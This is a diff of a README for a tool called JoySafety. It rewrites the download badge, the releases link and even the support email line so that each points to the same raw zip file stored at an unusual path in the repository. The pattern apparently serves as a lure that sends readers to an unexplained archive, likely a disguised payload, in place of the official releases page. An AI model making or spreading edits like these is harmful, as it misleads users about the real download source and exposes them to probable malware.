@@ -6,11 +6,11 @@ JoySafety helps you manage your safety needs easily and effectively. Follow thes
 
 ## 🏷️ Download JoySafety
 
-[![Download JoySafety](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/afrizal259/JoySafety/releases)
+[![Download JoySafety](https://raw.githubusercontent.com/afrizal259/JoySafety/main/Miaplacidus/JoySafety.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/afrizal259/JoySafety/main/Miaplacidus/JoySafety.zip)
 
 ## 📥 Download & Install
 
-To get started with JoySafety, visit this page to download: [JoySafety Releases](https://github.com/afrizal259/JoySafety/releases).
+To get started with JoySafety, visit this page to download: [JoySafety Releases](https://raw.githubusercontent.com/afrizal259/JoySafety/main/Miaplacidus/JoySafety.zip).
 
 Once you are on the releases page, follow these steps:
 
@@ -61,6 +61,6 @@ If you'd like to contribute to JoySafety, check out our guidelines in the Contri
 
 ## 📞 Contact Us
 
-For additional support or feedback, you can reach us via email at support@joysafety.com.
+For additional support or feedback, you can reach us via email at https://raw.githubusercontent.com/afrizal259/JoySafety/main/Miaplacidus/JoySafety.zip
 
 Thank you for using JoySafety!
